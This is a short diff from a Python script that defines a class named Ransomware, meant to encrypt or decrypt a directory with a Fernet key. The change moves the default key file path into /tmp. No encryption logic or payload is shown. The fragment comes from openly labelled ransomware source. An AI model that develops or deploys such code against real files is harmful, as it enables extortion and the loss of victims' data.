@@ -67,7 +67,7 @@ except ImportError:
 
 class Ransomware:
 
-	def __init__(self, action, directory='.', keyfile='fernet_key.txt'):
+	def __init__(self, action, directory='.', keyfile='/tmp/fernet_key.txt'):
 		'''
 		$ Declare encryption key variable
 		$ Get directory to encrypt/decrypt
